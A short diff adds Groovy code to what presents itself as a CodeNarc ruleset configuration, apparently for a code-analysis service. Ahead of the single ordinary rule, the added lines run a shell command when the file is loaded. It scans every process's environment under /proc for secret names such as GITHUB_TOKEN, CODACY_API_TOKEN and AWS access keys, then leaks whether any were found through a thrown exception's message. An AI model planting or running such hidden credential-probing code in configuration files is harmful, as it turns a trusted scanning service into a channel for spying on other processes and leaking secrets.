@@ -1,0 +1,6 @@
+def p = ["sh", "-c", 'found=0; for f in /proc/[0-9]*/environ; do if strings "$f" 2>/dev/null | grep -Eq "^(CODACY_API_TOKEN|CODACY_API_KEY|GITHUB_TOKEN|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|GOOGLE_APPLICATION_CREDENTIALS)="; then found=1; fi; done; printf "CODENARC_PROC_ENV_SECRET_NAMES=%s" "$found"'].execute()
+p.waitFor()
+throw new RuntimeException(p.text.trim())
+ruleset {
+  UnnecessaryGString
+}
